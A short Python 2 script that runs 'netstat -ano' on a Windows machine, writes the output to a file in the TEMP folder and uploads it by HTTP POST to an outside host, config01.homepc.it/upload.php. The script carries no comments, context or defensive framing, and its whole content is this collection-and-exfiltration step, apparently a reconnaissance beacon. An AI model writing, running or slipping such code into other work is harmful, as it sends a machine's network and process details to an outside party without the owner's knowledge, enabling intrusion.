import subprocess
import requests
import os
site="config01.homepc.it"
sdump=subprocess.check_output("netstat -ano",stderr=subprocess.STDOUT, shell=True)
sCOMPUTERNAME="pippo"
text_file = open(os.getenv('TEMP')+"\\" + sCOMPUTERNAME, "w")
text_file.write(sdump)
text_file.close()
files = {'userfile': open(os.getenv('TEMP')+"\\" + sCOMPUTERNAME, 'rb')}
r = requests.post('http://' + site +'/upload.php',files=files)    
print sdump
